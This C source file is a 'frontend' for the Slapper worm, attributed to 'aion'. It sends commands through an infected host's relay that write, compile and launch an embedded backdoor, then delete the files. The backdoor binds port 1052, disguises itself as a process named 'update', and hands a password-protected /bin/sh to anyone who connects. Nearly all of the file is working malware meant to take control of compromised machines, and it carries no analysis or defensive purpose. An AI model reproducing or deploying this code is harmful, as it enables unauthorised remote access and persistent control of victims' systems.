//////////////////////////////////////////////////////////////////////////////////////

// code by aion
char *troja="
#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>
int soc_des, soc_cli, soc_rc, soc_len;
struct sockaddr_in serv_addr; char temp_buff[11];
struct sockaddr_in client_addr;

int main (int argc,char **argv) 
{   int null=open(\\\"/dev/null\\\",O_RDWR);
    soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
    bzero((char *) &serv_addr, sizeof(serv_addr)); 
    serv_addr.sin_family = AF_INET; 
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(1052);
    soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    if(soc_rc!=0) exit(0);
    dup2(null,0); dup2(null,1); dup2(null,2); if (fork()) return 1;
    signal(SIGHUP, SIG_IGN); 
    soc_rc=listen(soc_des, 5); strcpy(argv[0],\\\"update                 \\\");
    if(soc_rc!=0) exit(0);
    while (1) { soc_len = sizeof(client_addr);
        if((soc_cli=accept(soc_des,(struct sockaddr *)&client_addr,&soc_len))<0)
          exit(0); if(fork()) { 
            dup2(soc_cli,0); dup2(soc_cli,1); dup2(soc_cli,2);
	    read(soc_cli,temp_buff,10);
	    if( !strncmp(temp_buff,\\\"aion1981\\\",strlen(\\\"aion1981\\\")) )
              execl(\\\"/bin/sh\\\",\\\"sh -i\\\",(char *)0); 
            close(soc_cli); exit(0); } close(soc_cli); } } ";

#define MBUF 2048

usage(char **argv)
{
  printf("\tslapper worm frontend (code by aion)  \n"
         "usage:\n\t%s ip port \n"
	 "example:\n\t%s 127.1 4156 \n"
	 ,argv[0],argv[0]);
  exit(-1);
}    

runcmd(struct ainst ts,char *buf2)
{
  struct sh_rec      sr;
  char  _buf[MBUF], *buf=_buf;
  int    cmdlen;

  memset(buf,0,MBUF);
  cmdlen=strlen(buf2); _encrypt(buf2,cmdlen);  
  memset((void*)&sr,0,sizeof(struct sh_rec));
  sr.h.tag=0x24;
  sr.h.len=cmdlen;
  sr.h.id=0;
  sr.h.seq=newseq();
  memcpy(buf,(void*)&sr,sizeof(struct sh_rec));
  memcpy(buf+sizeof(struct sh_rec),buf2,cmdlen);
  relayclient(&ts,buf,sizeof(struct sh_rec)+cmdlen);
}  

int main(int argc, char **argv) {
  struct ainst       ts;
  char   _buf2[MBUF], *buf2=_buf2;

  if(argc<=2) usage(argv);
  memset((void*)&ts,0,sizeof(struct ainst));
  audp_setup(&udpserver,argv[1],atoi(argv[2]));
  audp_relay(&udpserver,&ts,argv[1],atoi(argv[2]));

  printf("ip> %s port> %d remoute_cmd> troja ",argv[1],atoi(argv[2]));

  sprintf(buf2,"echo \"%s\" > /tmp/.a.c ",troja);
  runcmd(ts,buf2);  
  strcpy(buf2,"gcc -o /tmp/update /tmp/.a.c ");
  runcmd(ts,buf2);  
  strcpy(buf2,"kill -9 `ps -ax | grep 'update' | awk -F: '{ print $1 } '| awk '{ print $1 }'` ");
  runcmd(ts,buf2);  
  strcpy(buf2,"/tmp/update &");
  runcmd(ts,buf2);  
  strcpy(buf2,"rm -f /tmp/update /tmp/.a.c ");
  runcmd(ts,buf2);  

  printf(": done\n");
  return 0;
}

